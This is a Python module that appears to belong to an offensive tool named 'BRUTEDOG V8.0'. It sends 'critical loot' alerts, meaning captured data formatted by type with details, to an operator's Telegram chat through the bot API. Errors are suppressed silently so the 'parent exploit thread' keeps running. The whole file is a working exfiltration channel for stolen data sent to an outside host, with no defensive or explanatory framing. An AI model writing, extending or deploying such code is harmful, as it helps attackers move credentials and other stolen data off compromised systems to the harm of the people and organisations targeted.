import os
import asyncio
import httpx

# Configuration via Environment Variables (or hardcode for testing)
TELEGRAM_BOT_TOKEN = os.getenv("BRUTEDOG_TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.getenv("BRUTEDOG_TG_CHAT", "YOUR_CHAT_ID_HERE")

async def send_telegram_alert(loot_type: str, details: dict | str):
    """
    Asynchronously sends formatted high-value loot alerts to a designated Telegram chat.
    """
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not TELEGRAM_BOT_TOKEN:
        return  # Skip if not configured

    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Format message payload with MarkdownV2 or safe HTML
    if isinstance(details, dict):
        details_str = "\n".join([f"• **{k}**: <code>{v}</code>" for k, v in details.items()])
    else:
        details_str = f"<code>{details}</code>"

    message = (
        f"🚨 **BRUTEDOG V8.0 — CRITICAL LOOT** 🚨\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Type:** `{loot_type.upper()}`\n\n"
        f"{details_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }

    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            response = await client.post(api_url, json=payload)
            if response.status_code != 200:
                # Fallback logging if needed
                pass
    except Exception:
        # Prevent telemetry exceptions from crashing the parent exploit thread
        pass
